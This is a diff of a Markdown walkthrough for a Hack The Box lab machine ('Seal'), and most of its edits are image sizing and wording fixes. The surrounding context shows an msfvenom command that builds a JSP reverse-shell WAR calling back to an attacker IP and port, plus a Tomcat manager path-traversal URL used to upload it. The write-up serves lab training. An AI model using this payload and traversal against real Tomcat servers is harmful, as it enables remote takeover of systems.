@@ -23,7 +23,7 @@ output: html_document
 **Ports/services exploited:** 80/web application, TomCat, ssh\\
 **Tools:** Burp, linpeas\\
 **Techniques:** Directory Traversal\\
-**Keywords:** Tomcat, ansible\\ 
+**Keywords:** Tomcat, ansible\\
 **In a nutshell**: 
 
 ## 1. Services enumeration
@@ -45,23 +45,23 @@ I always find it hard to start with this kind of result because there are so man
 When browsing to *10.10.10.245:8080*, we land on the following page:
 
 <div class="img_container">
-![site]({{https://jsom1.github.io/}}/_images/htb_seal_site.png)
+![site]({{https://jsom1.github.io/}}/_images/htb_seal_site.png){: height="415px" width = 625px"}
 </div>
 
 We see it's GitBucket, a Git web platform very similar to Github. Since I don't have a GitBucket account, let's create one. Once this is done, we are automatically connected to the platform:
 
 <div class="img_container">
-![git]({{https://jsom1.github.io/}}/_images/htb_seal_git.png)
+![git]({{https://jsom1.github.io/}}/_images/htb_seal_git.png){: height="415px" width = 625px"}
 </div>
 
-There are 2 repositories, *seal_market* and *infra*. We also see the user *root* as well as *luis*. By looking around on the site, we see something interesting:
+There are 2 repositories, *seal_market* and *infra*. We also see the user *root* as well as *luis*. By looking around on the site, we see interesting information:
 
 <div class="img_container">
-![info]({{https://jsom1.github.io/}}/_images/htb_seal_info.png)
+![info]({{https://jsom1.github.io/}}/_images/htb_seal_info.png){: height="415px" width = 625px"}
 </div>
 
 First, we see it's an online shopping application. We also see a *tomcat* folder, indicating it's probably hosting the application.\\
-I have already seen Tomcat but don't know it well, so here's what I found on Wiki:\\
+I have already seen Tomcat but don't know it well, so here's a little reminder I found on Wiki:\\
 *Apache Tomcat (called "Tomcat" for short) is a free and open-source implementation of the Jakarta Servlet (JSP), Jakarta Expression Language, and WebSocket technologies. 
 Tomcat provides a "pure Java" HTTP web server environment in which Java code can run.*
 
@@ -69,14 +69,14 @@ Finally, there are some ToDo notes, among which one mentions a tomcat configurat
 Let's then look if we can find this file. After a little bit of research, we see the following:
 
 <div class="img_container">
-![creds]({{https://jsom1.github.io/}}/_images/htb_seal_creds.png)
+![creds]({{https://jsom1.github.io/}}/_images/htb_seal_creds.png){: height="415px" width = 625px"}
 </div>
 
 This is the updated file that was mentionned in the notes, and there are a username and a cleartext password to connect to tomcat. 
 We must find where to use them. Nmap also showed a web server on port 443 (ssl), so maybe we will find it there. Let's browse to *https://10.10.10.250*:
 
 <div class="img_container">
-![ssl]({{https://jsom1.github.io/}}/_images/htb_seal_ssl.png)
+![ssl]({{https://jsom1.github.io/}}/_images/htb_seal_ssl.png){: height="415px" width = 625px"}
 </div>
 
 This is the shopping web app. There isn't really any interesting information on the page, but there is a search field. We can check if the app is vulnerable to cross-site scripting (XSS) by inputting the following text:
@@ -108,7 +108,7 @@ We can enter the credentials we discovered earlier. Note that I added *seal.htb*
 We land on the Tomcat manager page:
 
 <div class="img_container">
-![manager]({{https://jsom1.github.io/}}/_images/htb_seal_manag.png)
+![manager]({{https://jsom1.github.io/}}/_images/htb_seal_manag.png){: height="415px" width = 625px"}
 </div>
 
 We see the exact version of Tomcat, so let's see if there is an existing exploit for it:
@@ -126,7 +126,7 @@ Then, upload the revshell.war file and access to it (/revshell/)*
 The problem is we have nothing to upload such a file. I had to look at the forum for help: apparently, the application is vulnerable to **Directory Traversal**, and we can access the page we want by browsing to *https://seal.htb/manager/jmxproxy/..;/hmtl*:
 
 <div class="img_container">
-![manager2]({{https://jsom1.github.io/}}/_images/htb_seal_manag2.png)
+![manager2]({{https://jsom1.github.io/}}/_images/htb_seal_manag2.png){: height="415px" width = 625px"}
 </div>
 
 We now indeed see the possibility to upload files. Let's generate the payload as indicated in the article:
@@ -135,10 +135,10 @@ We now indeed see the possibility to upload files. Let's generate the payload as
 sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f war -o revshell.war
 `````
 
-After uplloading it on the server and refreshing the page, we see it in the applications:
+After uploading it on the server and refreshing the page, we see it in the applications:
 
 <div class="img_container">
-![manager3]({{https://jsom1.github.io/}}/_images/htb_seal_manag3.png)
+![manager3]({{https://jsom1.github.io/}}/_images/htb_seal_manag3.png){: height="415px" width = 625px"}
 </div>
 
 We set up a netcat listener on port 4444:
@@ -156,7 +156,7 @@ And we click on our uploaded shell:
 It doesn't work. We see in the URL where it tried to upload it: */manager/html/upload*. However, we don't have access to that directory. Let's set up Burp as a Proxy and intercept the request. We see the POST request to */manager/html/upload*, and we will change it as follows:
 
 <div class="img_container">
-![burp]({{https://jsom1.github.io/}}/_images/htb_seal_burp.png)
+![burp]({{https://jsom1.github.io/}}/_images/htb_seal_burp.png){: height="415px" width = 625px"}
 </div>
 
 Then, we forward the request and look if our listener caught the connection:
@@ -278,7 +278,7 @@ We use *ansible-playbook* to run our file
 And we're root!
 
 <div class="img_container">
-![pwn]({{https://jsom1.github.io/}}/_images/htb_seal_pwn.png)
+![pwn]({{https://jsom1.github.io/}}/_images/htb_seal_pwn.png){: height="200px" width = 190px"}
 </div>
 
 
